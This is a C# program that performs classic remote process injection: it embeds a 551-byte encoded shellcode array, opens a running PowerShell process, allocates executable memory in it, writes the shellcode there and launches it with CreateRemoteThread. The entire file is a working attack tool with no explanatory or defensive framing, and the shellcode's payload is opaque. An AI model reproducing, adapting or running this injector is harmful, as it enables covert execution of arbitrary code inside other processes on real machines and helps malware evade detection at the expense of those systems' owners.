using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, int bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern int CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern int WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] buffer, uint size, out int lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    public static void Main()
    {
        byte[] shellcode = new byte[551] {0x48,0x31,0xc9,0x48,0x81,0xe9,
0xc0,0xff,0xff,0xff,0x48,0x8d,0x05,0xef,0xff,0xff,0xff,0x48,
0xbb,0xe2,0x50,0x93,0x98,0xb6,0xc6,0x1d,0xbc,0x48,0x31,0x58,
0x27,0x48,0x2d,0xf8,0xff,0xff,0xff,0xe2,0xf4,0x1e,0x18,0x10,
0x7c,0x46,0x2e,0xd1,0xbc,0xe2,0x50,0xd2,0xc9,0xf7,0x96,0x4f,
0xed,0xb4,0x18,0xa2,0x4a,0xd3,0x8e,0x96,0xee,0x82,0x18,0x18,
0xca,0xae,0x8e,0x96,0xee,0xc2,0x18,0x18,0xea,0xe6,0x8e,0x12,
0x0b,0xa8,0x1a,0xde,0xa9,0x7f,0x8e,0x2c,0x7c,0x4e,0x6c,0xf2,
0xe4,0xb4,0xea,0x3d,0xfd,0x23,0x99,0x9e,0xd9,0xb7,0x07,0xff,
0x51,0xb0,0x18,0x18,0xca,0x96,0x87,0x4c,0x37,0xa0,0x6c,0xdb,
0x99,0x66,0xa0,0x9c,0xc4,0xfa,0x5b,0x91,0x97,0x33,0xb4,0x1d,
0xbc,0xe2,0xdb,0x13,0x10,0xb6,0xc6,0x1d,0xf4,0x67,0x90,0xe7,
0xff,0xfe,0xc7,0xcd,0xf8,0x69,0x10,0xb3,0xc8,0x3d,0x8e,0x05,
0xf5,0xe3,0x80,0x70,0xce,0xfb,0xf7,0xd4,0xf4,0x1d,0x99,0xd2,
0x13,0x82,0x4e,0x55,0xbd,0x34,0x18,0xa2,0x58,0x1a,0x87,0xdc,
0x75,0xef,0x11,0x92,0x59,0x8e,0x26,0x68,0x4d,0xae,0x53,0xdf,
0xbc,0xbe,0x83,0x24,0x6d,0x97,0x88,0xcb,0xdc,0x3d,0x86,0x39,
0xf5,0xe3,0x80,0xf5,0xd9,0x3d,0xca,0x55,0xf8,0x69,0x10,0x8f,
0xd1,0xb7,0x16,0x5c,0x37,0xe6,0xd8,0xd2,0xc0,0xfe,0xc7,0xcd,
0xfd,0xba,0x0e,0xca,0xc2,0xf7,0x9e,0x5c,0xe5,0xa3,0x0a,0xdb,
0x1b,0x5a,0xe6,0x5c,0xee,0x1d,0xb0,0xcb,0xd9,0xef,0x9c,0x55,
0x37,0xf0,0xb9,0xd8,0x67,0x49,0x39,0x40,0xf5,0x5c,0x27,0xe0,
0xaa,0xe9,0xf5,0x2f,0xbc,0xe2,0x11,0xc5,0xd1,0x3f,0x20,0x55,
0x3d,0x0e,0xf0,0x92,0x98,0xb6,0x8f,0x94,0x59,0xab,0xec,0x91,
0x98,0xa7,0x9a,0xdd,0x14,0xa6,0xf0,0xd2,0xcc,0xff,0x4f,0xf9,
0xf0,0x6b,0xa1,0xd2,0x22,0xfa,0xb1,0x3b,0xbb,0x1d,0x85,0xdf,
0x11,0x5c,0xae,0x1c,0xbd,0xe2,0x50,0xca,0xd9,0x0c,0xef,0x9d,
0xd7,0xe2,0xaf,0x46,0xf2,0xbc,0x87,0x43,0xec,0xb2,0x1d,0xa2,
0x51,0xfb,0xf7,0xdd,0xf4,0x1d,0x90,0xdb,0x11,0x74,0x8e,0xe2,
0x7c,0xaa,0xd9,0x52,0xd9,0x0c,0x2c,0x12,0x63,0x02,0xaf,0x46,
0xd0,0x3f,0x01,0x77,0xac,0xa3,0x08,0xdf,0x11,0x54,0x8e,0x94,
0x45,0xa3,0xea,0x0a,0x3d,0xc2,0xa7,0xe2,0x69,0x67,0x90,0xe7,
0x92,0xff,0x39,0xd3,0xc9,0x07,0xb8,0x00,0x98,0xb6,0xc6,0x55,
0x3f,0x0e,0x40,0xdb,0x11,0x54,0x8b,0x2c,0x75,0x88,0x54,0xd2,
0xc0,0xfe,0x4f,0xe4,0xfd,0x58,0x52,0x4a,0x50,0xe9,0x39,0xc8,
0x3f,0x1a,0x50,0xed,0xcd,0xfe,0x45,0xd9,0x9c,0xbc,0xd9,0x65,
0xf2,0xf6,0x87,0x44,0xd4,0xe2,0x40,0x93,0x98,0xf7,0x9e,0x55,
0x35,0x10,0x18,0xa2,0x51,0xf7,0x7c,0x45,0x18,0xb1,0xb5,0x6c,
0x4d,0xfe,0x4f,0xde,0xf5,0x6b,0x97,0xde,0xa9,0x7f,0x8f,0x94,
0x4c,0xaa,0xd9,0x49,0xd0,0x3f,0x3f,0x5c,0x06,0xe0,0x89,0x5b,
0xc7,0x49,0x13,0x9e,0x44,0xe2,0x2d,0xbb,0xc0,0xf7,0x91,0x44,
0xd4,0xe2,0x10,0x93,0x98,0xf7,0x9e,0x77,0xbc,0xb8,0x11,0x29,
0x93,0x99,0xc9,0x2d,0x43,0x37,0x07,0xca,0xd9,0x0c,0xb3,0x73,
0xf1,0x83,0xaf,0x46,0xd1,0x49,0x08,0xf4,0x80,0x1d,0xaf,0x6c,
0xd0,0xb7,0x05,0x55,0x95,0x24,0x18,0x16,0x6e,0xc3,0x72,0x5c,
0x43,0x05,0x08,0xf9,0x98,0xef,0x8f,0xda,0x7e,0x12,0xe5,0x31,
0xce,0x49,0x13,0x1d,0xbc};

        Process[] processes = Process.GetProcessesByName("powershell");
        if (processes.Length == 0)
        {
            Console.WriteLine("Target process not found.");
            return;
        }

        Process targetProcess = processes[0];
        IntPtr hProcess = OpenProcess(0x1F0FFF, 0, targetProcess.Id);
        if (hProcess == IntPtr.Zero)
        {
            Console.WriteLine("Failed to open the target process.");
            return;
        }

        IntPtr remoteMemory = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x1000, 0x40);
        if (remoteMemory == IntPtr.Zero)
        {
            Console.WriteLine("Failed to allocate memory in the target process.");
            CloseHandle(hProcess);
            return;
        }

        int bytesWritten;
        if (WriteProcessMemory(hProcess, remoteMemory, shellcode, (uint)shellcode.Length, out bytesWritten) == 0)
        {
            Console.WriteLine("Failed to write shellcode to the target process.");
            CloseHandle(hProcess);
            return;
        }

        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, remoteMemory, IntPtr.Zero, 0, IntPtr.Zero);
        if (hThread == IntPtr.Zero)
        {
            Console.WriteLine("Failed to create a remote thread in the target process.");
            CloseHandle(hProcess);
            return;
        }

        Console.WriteLine("Shellcode injected successfully.");
        CloseHandle(hProcess);
    }
}
